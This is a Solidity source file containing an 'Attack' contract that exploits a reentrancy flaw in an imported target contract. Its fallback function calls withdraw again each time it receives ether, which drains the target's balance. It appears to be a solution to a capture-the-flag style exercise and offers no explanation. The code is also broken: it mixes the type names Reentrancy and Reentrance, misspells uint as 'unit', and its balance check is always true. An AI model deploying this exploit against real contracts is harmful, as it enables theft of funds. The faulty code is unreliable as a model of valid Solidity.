pragma solidity ^0.8.0;

import "./re_entrancy.sol";

contract Attack {
    Reentrancy public target;

    constructor(address payable _etherStoreAddress) {
        target = Reentrance(_etherStoreAddress);

    }
    //fallback is called when reentrancy sends ether to this contract

    fallback() external payable {
        if (address(target).balance >= 0) {
            //needs amount inculed 
            target.withdraw(1000000000000000 wei);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 wei);
        target.donate{value: 3 wei, gas: 40000000}(address(this));
        target.withdraw(1000000000000000 wei);

    }
    //helper function to check the balance of this contract
    function getBalance() public view returns (unit) {
        return address(this).balance;
    }

}